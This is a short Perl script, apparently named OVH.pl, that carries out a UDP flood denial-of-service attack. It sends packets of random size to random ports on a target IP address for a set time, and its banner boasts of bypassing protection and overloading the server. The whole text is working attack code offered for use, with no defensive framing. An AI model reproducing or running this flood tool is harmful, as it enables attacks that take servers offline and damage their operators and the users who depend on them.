
use Socket;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Usage: perl OVH.pl <Target>\n";
$endtime = time() + ($time ? $time : 120);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "Target:$ip Time:120 \n";
print "100 UP Bypass Made By your_offline Overloading This Server with power\n";

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","00bf269577d884b60b30f662a6"), 0, pack_sockaddr_in($pport, $iaddr));}